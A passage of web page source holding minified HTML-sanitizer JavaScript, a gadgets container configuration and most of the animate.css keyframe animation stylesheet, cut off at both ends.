th:"HTMLTableHeaderCellElement",thead:"HTMLTableSectionElement",time:"HTMLTimeElement",title:"HTMLTitleElement",tr:"HTMLTableRowElement",track:"HTMLTrackElement",tt:"HTMLElement",u:"HTMLElement",ul:"HTMLUListElement","var":"HTMLElement",video:"HTMLVideoElement",wbr:"HTMLElement"};M.ELEMENT_DOM_INTERFACES=M.O;M.N={NOT_LOADED:0,SAME_DOCUMENT:1,NEW_DOCUMENT:2};M.ueffects=M.N;
M.J={"a::href":2,"area::href":2,"audio::src":1,"blockquote::cite":0,"command::icon":1,"del::cite":0,"form::action":2,"img::src":1,"input::src":1,"ins::cite":0,"q::cite":0,"video::poster":1,"video::src":1};M.URIEFFECTS=M.J;M.L={UNSANDBOXED:2,SANDBOXED:1,DATA:0};M.ltypes=M.L;M.I={"a::href":2,"area::href":2,"audio::src":2,"blockquote::cite":2,"command::icon":1,"del::cite":2,"form::action":2,"img::src":1,"input::src":1,"ins::cite":2,"q::cite":2,"video::poster":1,"video::src":2};M.LOADERTYPES=M.I;
"undefined"!==typeof window&&(window.html4=M);var Q=function(e){function x(d){if(D.hasOwnProperty(d))return D[d];var a=d.match(R);return a?String.fromCharCode(parseInt(a[1],10)):(a=d.match(S))?String.fromCharCode(parseInt(a[1],16)):E&&T.test(d)?(E.innerHTML="&"+d+";",a=E.textContent,D[d]=a):"&"+d+";"}function y(d,a){return x(a)}function u(d){return d.replace(U,y)}function v(d){return(""+d).replace(N,"&amp;").replace(F,"&lt;").replace(G,"&gt;").replace(V,"&#34;")}function b(d){return(""+d).replace(N,"&amp;").replace(F,"&lt;").replace(G,"&gt;")}
function p(d){return d.replace(W,"&amp;$1").replace(F,"&lt;").replace(G,"&gt;")}function z(d){var a={z:d.z||d.cdata,A:d.A||d.comment,B:d.B||d.endDoc,t:d.t||d.endTag,d:d.d||d.pcdata,F:d.F||d.rcdata,H:d.H||d.startDoc,v:d.v||d.startTag};return function(d,e){var f;var r=/(<\/|<\!--|<[!?]|[&<>])/g;f=d+"";if(X)f=f.split(r);else{for(var k=[],i=0,b;(b=r.exec(f))!==l;)k.push(f.substring(i,b.index)),k.push(b[0]),i=b.index+b[0].length;k.push(f.substring(i));f=k}w(a,f,0,{r:!1,C:!1},e)}}function j(d,a,c,e,f){return function(){w(d,
a,c,e,f)}}function w(d,a,c,h,f){try{d.H&&0==c&&d.H(f);for(var r,k,i,b=a.length;c<b;){var n=a[c++],g=a[c];switch(n){case "&":Y.test(g)?(d.d&&d.d("&"+g,f,t,j(d,a,c,h,f)),c++):d.d&&d.d("&amp;",f,t,j(d,a,c,h,f));break;case "</":if(r=/^([-\w:]+)[^\'\"]*/.exec(g))if(r[0].length===g.length&&">"===a[c+1])c+=2,i=r[1].toLowerCase(),d.t&&d.t(i,f,t,j(d,a,c,h,f));else{var m=a,o=c,p=d,s=f,u=t,x=h,v=C(m,o);v?(p.t&&p.t(v.name,s,u,j(p,m,o,x,s)),c=v.next):c=m.length}else d.d&&d.d("&lt;/",f,t,j(d,a,c,h,f));break;case "<":if(r=
/^([-\w:]+)\s*\/?/.exec(g))if(r[0].length===g.length&&">"===a[c+1]){c+=2;i=r[1].toLowerCase();d.v&&d.v(i,[],f,t,j(d,a,c,h,f));var w=e.e[i];w&O&&(c=B(a,{name:i,next:c,c:w},d,f,t,h))}else{var m=a,o=d,p=f,s=t,u=h,A=C(m,c);A?(o.v&&o.v(A.name,A.P,p,s,j(o,m,A.next,u,p)),c=A.c&O?B(m,A,o,p,s,u):A.next):c=m.length}else d.d&&d.d("&lt;",f,t,j(d,a,c,h,f));break;case "<\!--":if(!h.C){for(k=c+1;k<b&&!(">"===a[k]&&/--$/.test(a[k-1]));k++);if(k<b){if(d.A){var y=a.slice(c,k).join("");d.A(y.substr(0,y.length-2),f,
t,j(d,a,k+1,h,f))}c=k+1}else h.C=!0}h.C&&d.d&&d.d("&lt;!--",f,t,j(d,a,c,h,f));break;case "<!":if(/^\w/.test(g)){if(!h.r){for(k=c+1;k<b&&">"!==a[k];k++);k<b?c=k+1:h.r=!0}h.r&&d.d&&d.d("&lt;!",f,t,j(d,a,c,h,f))}else d.d&&d.d("&lt;!",f,t,j(d,a,c,h,f));break;case "<?":if(!h.r){for(k=c+1;k<b&&">"!==a[k];k++);k<b?c=k+1:h.r=!0}h.r&&d.d&&d.d("&lt;?",f,t,j(d,a,c,h,f));break;case ">":d.d&&d.d("&gt;",f,t,j(d,a,c,h,f));break;case "":break;default:d.d&&d.d(n,f,t,j(d,a,c,h,f))}}d.B&&d.B(f)}catch(z){if(z!==t)throw z;
}}function B(a,b,c,h,f,r){var k=a.length;H.hasOwnProperty(b.name)||(H[b.name]=RegExp("^"+b.name+"(?:[\\s\\/]|$)","i"));for(var i=H[b.name],g=b.next,n=b.next+1;n<k&&!("</"===a[n-1]&&i.test(a[n]));n++);n<k&&(n-=1);k=a.slice(g,n).join("");if(b.c&e.c.CDATA)c.z&&c.z(k,h,f,j(c,a,n,r,h));else if(b.c&e.c.RCDATA)c.F&&c.F(p(k),h,f,j(c,a,n,r,h));else throw Error("bug");return n}function C(a,b){var c=/^([-\w:]+)/.exec(a[b]),h={};h.name=c[1].toLowerCase();h.c=e.e[h.name];for(var f=a[b].substr(c[0].length),r=b+
1,k=a.length;r<k&&">"!==a[r];r++)f+=a[r];if(!(k<=r)){for(var i=[];""!==f;)if(c=Z.exec(f))if(c[4]&&!c[5]||c[6]&&!c[7]){for(var c=c[4]||c[6],g=!1,f=[f,a[r++]];r<k;r++){if(g){if(">"===a[r])break}else 0<=a[r].indexOf(c)&&(g=!0);f.push(a[r])}if(k<=r)break;f=f.join("")}else{var g=c[1].toLowerCase(),n;if(c[2]){n=c[3];var j=n.charCodeAt(0);if(34===j||39===j)n=n.substr(1,n.length-2);n=u(n.replace($,""))}else n="";i.push(g,n);f=f.substr(c[0].length)}else f=f.replace(/^[\s\S][^a-z\s]*/,"");h.P=i;h.next=r+1;
return h}}function a(a){function g(){var a=h[h.length-1];return a?e.e[a.m]:0}function c(a){var d=h[h.length-1];if(!d)throw Error("shouldn't happen: CDATA/RCDATA context without any start tag");return a.replace(RegExp("</"+d.m+"(?=[^A-Za-z])>?","i"),"</>")}var h,f;return z({startDoc:function(){h=[];f=!1},startTag:function(c,b,i){if(!f&&e.e.hasOwnProperty(c)){var g=e.e[c];if(!(g&e.c.FOLDABLE)){var n=a(c,b);if(n){if("object"!==typeof n)throw Error("tagPolicy did not return object (old API?)");if("attribs"in
n)b=n.attribs;else throw Error("tagPolicy gave no attribs");var j;"tagName"in n?(j=n.tagName,n=e.e[j]):(j=c,n=g);if(g&e.c.OPTIONAL_ENDTAG){var m=h[h.length-1];m&&m.D===c&&(m.m!==j||c!==j)&&i.push("</",m.m,">")}g&e.c.EMPTY||h.push({D:c,m:j});i.push("<",j);c=0;for(m=b.length;c<m;c+=2){var o=b[c],p=b[c+1];p!==l&&void 0!==p&&i.push(" ",o,'="',v(p),'"')}i.push(">");g&e.c.EMPTY&&!(n&e.c.EMPTY)&&i.push("</",j,">")}else f=!(g&e.c.EMPTY)}}},endTag:function(a,d){if(f)f=!1;else if(e.e.hasOwnProperty(a)){var c=
e.e[a];if(!(c&(e.c.EMPTY|e.c.FOLDABLE))){if(c&e.c.OPTIONAL_ENDTAG)for(c=h.length;0<=--c;){var b=h[c].D;if(b===a)break;if(!(e.e[b]&e.c.OPTIONAL_ENDTAG))return}else for(c=h.length;0<=--c&&h[c].D!==a;);if(!(0>c)){for(b=h.length;--b>c;){var g=h[b].m;e.e[g]&e.c.OPTIONAL_ENDTAG||d.push("</",g,">")}c<h.length&&(a=h[c].m);h.length=c;d.push("</",a,">")}}}},pcdata:function(a,d){f||(g()&(e.c.RCDATA|e.c.CDATA)?d.push(c(a)):d.push(a))},rcdata:function(a,d){f||(g()&(e.c.RCDATA|e.c.CDATA)?d.push(c(a)):d.push(a))},
cdata:function(a,d){f||(g()&e.c.CDATA?d.push(c(a)):d.push(b(a)))},endDoc:function(a){for(;h.length;h.length--)a.push("</",h[h.length-1].m,">")}})}function J(a,b,c,e,f){if(!f)return l;try{var g=q.parse(""+a);if(g&&(!g.K()||aa.test(g.U()))){var k=f(g,b,c,e);return k?k.toString():l}}catch(i){}return l}function m(a,b,c,e,f){c||a(b+" removed",{Q:"removed",tagName:b});if(e!==f){var g="changed";e&&!f?g="removed":!e&&f&&(g="added");a(b+"."+c+" "+g,{Q:g,tagName:b,ia:c,oldValue:e,newValue:f})}}function K(a,
b,c){b=b+"::"+c;if(a.hasOwnProperty(b))return a[b];b="*::"+c;if(a.hasOwnProperty(b))return a[b]}function s(a,b,c,h,f){for(var g=0;g<b.length;g+=2){var k=b[g],i=b[g+1],j=i,n=l,o;if((o=a+"::"+k,e.w.hasOwnProperty(o))||(o="*::"+k,e.w.hasOwnProperty(o)))n=e.w[o];if(n!==l)switch(n){case e.f.NONE:break;case e.f.SCRIPT:i=l;f&&m(f,a,k,j,i);break;case e.f.STYLE:if("undefined"===typeof I){i=l;f&&m(f,a,k,j,i);break}var p=[];I(i,{declaration:function(a,b){var d=a.toLowerCase();P(d,b,c?function(a){return J(a,
e.N.ga,e.L.ha,{TYPE:"CSS",CSS_PROP:d},c)}:l);b.length&&p.push(d+": "+b.join(" "))}});i=0<p.length?p.join(" ; "):l;f&&m(f,a,k,j,i);break;case e.f.ID:case e.f.IDREF:case e.f.IDREFS:case e.f.GLOBAL_NAME:case e.f.LOCAL_NAME:case e.f.CLASSES:i=h?h(i):i;f&&m(f,a,k,j,i);break;case e.f.URI:i=J(i,K(e.J,a,k),K(e.I,a,k),{TYPE:"MARKUP",XML_ATTR:k,XML_TAG:a},c);f&&m(f,a,k,j,i);break;case e.f.URI_FRAGMENT:i&&"#"===i.charAt(0)?(i=i.substring(1),i=h?h(i):i,i!==l&&void 0!==i&&(i="#"+i)):i=l;f&&m(f,a,k,j,i);break;
default:i=l,f&&m(f,a,k,j,i)}else i=l,f&&m(f,a,k,j,i);b[g+1]=i}return b}function g(a,b,c){return function(g,f){if(e.e[g]&e.c.UNSAFE)c&&m(c,g,void 0,void 0,void 0);else return{attribs:s(g,f,a,b,c)}}}function L(b,e){var c=[];a(e)(b,c);return c.join("")}var I,P;"undefined"!==typeof window&&(I=window.parseCssDeclarations,P=window.sanitizeCssProperty);var D={lt:"<",LT:"<",gt:">",GT:">",amp:"&",AMP:"&",quot:'"',apos:"'",nbsp:"\u00a0"},R=/^#(\d+)$/,S=/^#x([0-9A-Fa-f]+)$/,T=/^[A-Za-z][A-Za-z0-9]+$/,E="undefined"!==
typeof window&&window.document?window.document.createElement("textarea"):l,$=/\0/g,U=/&(#[0-9]+|#[xX][0-9A-Fa-f]+|\w+);/g,Y=/^(#[0-9]+|#[xX][0-9A-Fa-f]+|\w+);/,N=/&/g,W=/&([^a-z#]|#(?:[^0-9x]|x(?:[^0-9a-f]|$)|$)|$)/gi,F=/[<]/g,G=/>/g,V=/\"/g,Z=/^\s*([-.:\w]+)(?:\s*(=)\s*((")[^"]*("|$)|(')[^']*('|$)|(?=[a-z][-\w]*\s*=)|[^"'\s]*))?/i,X=3==="a,b".split(/(,)/).length,O=e.c.CDATA|e.c.RCDATA,t={},H={},aa=/^(?:https?|geo|mailto|sms|tel)$/i,o={};o.ka=o.escapeAttrib=v;o.la=o.escapePcdata=b;o.ma=o.makeHtmlSanitizer=
a;o.na=o.makeSaxParser=z;o.oa=o.makeTagPolicy=g;o.qa=o.normalizeRCData=p;o.ra=o.sanitize=function(a,b,c,e){return L(a,g(b,c,e))};o.sa=o.sanitizeAttribs=s;o.ta=o.sanitizeWithPolicy=L;o.ua=o.unescapeEntities=u;return o}(M),ba=Q.sanitize;"undefined"!==typeof window&&(window.html=Q,window.html_sanitize=ba);})();
;
gadgets.config.init({"core.io":{"jsonProxyUrl":"//%host%/gadgets/makeRequest","proxyUrl":"//www.gmodules.com/gadgets/proxy/refresh=%refresh%&container=%container%%rewriteMime%&gadget=%gadget%/%rawurl%"},"shindig.auth":{"authToken":"","trustedJson":""},"core.util":{"core":{}}});
</script><script>gadgets.Prefs.setMessages_({});gadgets.Prefs.setDefaultPrefs_({});gadgets.io.preloaded_=[];</script><style type="text/css">
		* {
			padding: 0;
			margin: 0;
		}
		html, body {
			background: #000;
			color: #fff;
			overflow: hidden;
			touch-action: none;
			-ms-touch-action: none;
		}
		canvas {
			touch-action-delay: none;
			touch-action: none;
			-ms-touch-action: none;
		}
        @charset "UTF-8";

/*!
 * animate.css -http://daneden.me/animate
 * Version - 3.5.0
 * Licensed under the MIT license - http://opensource.org/licenses/MIT
 *
 * Copyright (c) 2015 Daniel Eden
 */

.animated {
  -webkit-animation-duration: 1s;
  animation-duration: 1s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
}

.animated.infinite {
  -webkit-animation-iteration-count: infinite;
  animation-iteration-count: infinite;
}

.animated.hinge {
  -webkit-animation-duration: 2s;
  animation-duration: 2s;
}

.animated.flipOutX,
.animated.flipOutY,
.animated.bounceIn,
.animated.bounceOut {
  -webkit-animation-duration: .75s;
  animation-duration: .75s;
}

@-webkit-keyframes bounce {
  from, 20%, 53%, 80%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    -webkit-transform: translate3d(0,0,0);
    transform: translate3d(0,0,0);
  }

  40%, 43% {
    -webkit-animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    -webkit-transform: translate3d(0, -30px, 0);
    transform: translate3d(0, -30px, 0);
  }

  70% {
    -webkit-animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    -webkit-transform: translate3d(0, -15px, 0);
    transform: translate3d(0, -15px, 0);
  }

  90% {
    -webkit-transform: translate3d(0,-4px,0);
    transform: translate3d(0,-4px,0);
  }
}

@keyframes bounce {
  from, 20%, 53%, 80%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    -webkit-transform: translate3d(0,0,0);
    transform: translate3d(0,0,0);
  }

  40%, 43% {
    -webkit-animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    -webkit-transform: translate3d(0, -30px, 0);
    transform: translate3d(0, -30px, 0);
  }

  70% {
    -webkit-animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    animation-timing-function: cubic-bezier(0.755, 0.050, 0.855, 0.060);
    -webkit-transform: translate3d(0, -15px, 0);
    transform: translate3d(0, -15px, 0);
  }

  90% {
    -webkit-transform: translate3d(0,-4px,0);
    transform: translate3d(0,-4px,0);
  }
}

.bounce {
  -webkit-animation-name: bounce;
  animation-name: bounce;
  -webkit-transform-origin: center bottom;
  transform-origin: center bottom;
}

@-webkit-keyframes flash {
  from, 50%, to {
    opacity: 1;
  }

  25%, 75% {
    opacity: 0;
  }
}

@keyframes flash {
  from, 50%, to {
    opacity: 1;
  }

  25%, 75% {
    opacity: 0;
  }
}

.flash {
  -webkit-animation-name: flash;
  animation-name: flash;
}

/* originally authored by Nick Pettit - https://github.com/nickpettit/glide */

@-webkit-keyframes pulse {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  50% {
    -webkit-transform: scale3d(1.05, 1.05, 1.05);
    transform: scale3d(1.05, 1.05, 1.05);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

@keyframes pulse {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  50% {
    -webkit-transform: scale3d(1.05, 1.05, 1.05);
    transform: scale3d(1.05, 1.05, 1.05);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

.pulse {
  -webkit-animation-name: pulse;
  animation-name: pulse;
}

@-webkit-keyframes rubberBand {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  30% {
    -webkit-transform: scale3d(1.25, 0.75, 1);
    transform: scale3d(1.25, 0.75, 1);
  }

  40% {
    -webkit-transform: scale3d(0.75, 1.25, 1);
    transform: scale3d(0.75, 1.25, 1);
  }

  50% {
    -webkit-transform: scale3d(1.15, 0.85, 1);
    transform: scale3d(1.15, 0.85, 1);
  }

  65% {
    -webkit-transform: scale3d(.95, 1.05, 1);
    transform: scale3d(.95, 1.05, 1);
  }

  75% {
    -webkit-transform: scale3d(1.05, .95, 1);
    transform: scale3d(1.05, .95, 1);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

@keyframes rubberBand {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  30% {
    -webkit-transform: scale3d(1.25, 0.75, 1);
    transform: scale3d(1.25, 0.75, 1);
  }

  40% {
    -webkit-transform: scale3d(0.75, 1.25, 1);
    transform: scale3d(0.75, 1.25, 1);
  }

  50% {
    -webkit-transform: scale3d(1.15, 0.85, 1);
    transform: scale3d(1.15, 0.85, 1);
  }

  65% {
    -webkit-transform: scale3d(.95, 1.05, 1);
    transform: scale3d(.95, 1.05, 1);
  }

  75% {
    -webkit-transform: scale3d(1.05, .95, 1);
    transform: scale3d(1.05, .95, 1);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

.rubberBand {
  -webkit-animation-name: rubberBand;
  animation-name: rubberBand;
}

@-webkit-keyframes shake {
  from, to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  10%, 30%, 50%, 70%, 90% {
    -webkit-transform: translate3d(-10px, 0, 0);
    transform: translate3d(-10px, 0, 0);
  }

  20%, 40%, 60%, 80% {
    -webkit-transform: translate3d(10px, 0, 0);
    transform: translate3d(10px, 0, 0);
  }
}

@keyframes shake {
  from, to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  10%, 30%, 50%, 70%, 90% {
    -webkit-transform: translate3d(-10px, 0, 0);
    transform: translate3d(-10px, 0, 0);
  }

  20%, 40%, 60%, 80% {
    -webkit-transform: translate3d(10px, 0, 0);
    transform: translate3d(10px, 0, 0);
  }
}

.shake {
  -webkit-animation-name: shake;
  animation-name: shake;
}

@-webkit-keyframes headShake {
  0% {
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }

  6.5% {
    -webkit-transform: translateX(-6px) rotateY(-9deg);
    transform: translateX(-6px) rotateY(-9deg);
  }

  18.5% {
    -webkit-transform: translateX(5px) rotateY(7deg);
    transform: translateX(5px) rotateY(7deg);
  }

  31.5% {
    -webkit-transform: translateX(-3px) rotateY(-5deg);
    transform: translateX(-3px) rotateY(-5deg);
  }

  43.5% {
    -webkit-transform: translateX(2px) rotateY(3deg);
    transform: translateX(2px) rotateY(3deg);
  }

  50% {
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
}

@keyframes headShake {
  0% {
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }

  6.5% {
    -webkit-transform: translateX(-6px) rotateY(-9deg);
    transform: translateX(-6px) rotateY(-9deg);
  }

  18.5% {
    -webkit-transform: translateX(5px) rotateY(7deg);
    transform: translateX(5px) rotateY(7deg);
  }

  31.5% {
    -webkit-transform: translateX(-3px) rotateY(-5deg);
    transform: translateX(-3px) rotateY(-5deg);
  }

  43.5% {
    -webkit-transform: translateX(2px) rotateY(3deg);
    transform: translateX(2px) rotateY(3deg);
  }

  50% {
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
}

.headShake {
  -webkit-animation-timing-function: ease-in-out;
  animation-timing-function: ease-in-out;
  -webkit-animation-name: headShake;
  animation-name: headShake;
}

@-webkit-keyframes swing {
  20% {
    -webkit-transform: rotate3d(0, 0, 1, 15deg);
    transform: rotate3d(0, 0, 1, 15deg);
  }

  40% {
    -webkit-transform: rotate3d(0, 0, 1, -10deg);
    transform: rotate3d(0, 0, 1, -10deg);
  }

  60% {
    -webkit-transform: rotate3d(0, 0, 1, 5deg);
    transform: rotate3d(0, 0, 1, 5deg);
  }

  80% {
    -webkit-transform: rotate3d(0, 0, 1, -5deg);
    transform: rotate3d(0, 0, 1, -5deg);
  }

  to {
    -webkit-transform: rotate3d(0, 0, 1, 0deg);
    transform: rotate3d(0, 0, 1, 0deg);
  }
}

@keyframes swing {
  20% {
    -webkit-transform: rotate3d(0, 0, 1, 15deg);
    transform: rotate3d(0, 0, 1, 15deg);
  }

  40% {
    -webkit-transform: rotate3d(0, 0, 1, -10deg);
    transform: rotate3d(0, 0, 1, -10deg);
  }

  60% {
    -webkit-transform: rotate3d(0, 0, 1, 5deg);
    transform: rotate3d(0, 0, 1, 5deg);
  }

  80% {
    -webkit-transform: rotate3d(0, 0, 1, -5deg);
    transform: rotate3d(0, 0, 1, -5deg);
  }

  to {
    -webkit-transform: rotate3d(0, 0, 1, 0deg);
    transform: rotate3d(0, 0, 1, 0deg);
  }
}

.swing {
  -webkit-transform-origin: top center;
  transform-origin: top center;
  -webkit-animation-name: swing;
  animation-name: swing;
}

@-webkit-keyframes tada {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  10%, 20% {
    -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
    transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
  }

  30%, 50%, 70%, 90% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
  }

  40%, 60%, 80% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

@keyframes tada {
  from {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }

  10%, 20% {
    -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
    transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
  }

  30%, 50%, 70%, 90% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
  }

  40%, 60%, 80% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
    transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
  }

  to {
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

.tada {
  -webkit-animation-name: tada;
  animation-name: tada;
}

/* originally authored by Nick Pettit - https://github.com/nickpettit/glide */

@-webkit-keyframes wobble {
  from {
    -webkit-transform: none;
    transform: none;
  }

  15% {
    -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
    transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
  }

  30% {
    -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
    transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
  }

  45% {
    -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
    transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
  }

  60% {
    -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
    transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
  }

  75% {
    -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
    transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes wobble {
  from {
    -webkit-transform: none;
    transform: none;
  }

  15% {
    -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
    transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
  }

  30% {
    -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
    transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
  }

  45% {
    -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
    transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
  }

  60% {
    -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
    transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
  }

  75% {
    -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
    transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

.wobble {
  -webkit-animation-name: wobble;
  animation-name: wobble;
}

@-webkit-keyframes jello {
  from, 11.1%, to {
    -webkit-transform: none;
    transform: none;
  }

  22.2% {
    -webkit-transform: skewX(-12.5deg) skewY(-12.5deg);
    transform: skewX(-12.5deg) skewY(-12.5deg);
  }

  33.3% {
    -webkit-transform: skewX(6.25deg) skewY(6.25deg);
    transform: skewX(6.25deg) skewY(6.25deg);
  }

  44.4% {
    -webkit-transform: skewX(-3.125deg) skewY(-3.125deg);
    transform: skewX(-3.125deg) skewY(-3.125deg);
  }

  55.5% {
    -webkit-transform: skewX(1.5625deg) skewY(1.5625deg);
    transform: skewX(1.5625deg) skewY(1.5625deg);
  }

  66.6% {
    -webkit-transform: skewX(-0.78125deg) skewY(-0.78125deg);
    transform: skewX(-0.78125deg) skewY(-0.78125deg);
  }

  77.7% {
    -webkit-transform: skewX(0.390625deg) skewY(0.390625deg);
    transform: skewX(0.390625deg) skewY(0.390625deg);
  }

  88.8% {
    -webkit-transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
  }
}

@keyframes jello {
  from, 11.1%, to {
    -webkit-transform: none;
    transform: none;
  }

  22.2% {
    -webkit-transform: skewX(-12.5deg) skewY(-12.5deg);
    transform: skewX(-12.5deg) skewY(-12.5deg);
  }

  33.3% {
    -webkit-transform: skewX(6.25deg) skewY(6.25deg);
    transform: skewX(6.25deg) skewY(6.25deg);
  }

  44.4% {
    -webkit-transform: skewX(-3.125deg) skewY(-3.125deg);
    transform: skewX(-3.125deg) skewY(-3.125deg);
  }

  55.5% {
    -webkit-transform: skewX(1.5625deg) skewY(1.5625deg);
    transform: skewX(1.5625deg) skewY(1.5625deg);
  }

  66.6% {
    -webkit-transform: skewX(-0.78125deg) skewY(-0.78125deg);
    transform: skewX(-0.78125deg) skewY(-0.78125deg);
  }

  77.7% {
    -webkit-transform: skewX(0.390625deg) skewY(0.390625deg);
    transform: skewX(0.390625deg) skewY(0.390625deg);
  }

  88.8% {
    -webkit-transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);
  }
}

.jello {
  -webkit-animation-name: jello;
  animation-name: jello;
  -webkit-transform-origin: center;
  transform-origin: center;
}

@-webkit-keyframes bounceIn {
  from, 20%, 40%, 60%, 80%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  20% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1);
    transform: scale3d(1.1, 1.1, 1.1);
  }

  40% {
    -webkit-transform: scale3d(.9, .9, .9);
    transform: scale3d(.9, .9, .9);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(1.03, 1.03, 1.03);
    transform: scale3d(1.03, 1.03, 1.03);
  }

  80% {
    -webkit-transform: scale3d(.97, .97, .97);
    transform: scale3d(.97, .97, .97);
  }

  to {
    opacity: 1;
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

@keyframes bounceIn {
  from, 20%, 40%, 60%, 80%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }

  20% {
    -webkit-transform: scale3d(1.1, 1.1, 1.1);
    transform: scale3d(1.1, 1.1, 1.1);
  }

  40% {
    -webkit-transform: scale3d(.9, .9, .9);
    transform: scale3d(.9, .9, .9);
  }

  60% {
    opacity: 1;
    -webkit-transform: scale3d(1.03, 1.03, 1.03);
    transform: scale3d(1.03, 1.03, 1.03);
  }

  80% {
    -webkit-transform: scale3d(.97, .97, .97);
    transform: scale3d(.97, .97, .97);
  }

  to {
    opacity: 1;
    -webkit-transform: scale3d(1, 1, 1);
    transform: scale3d(1, 1, 1);
  }
}

.bounceIn {
  -webkit-animation-name: bounceIn;
  animation-name: bounceIn;
}

@-webkit-keyframes bounceInDown {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
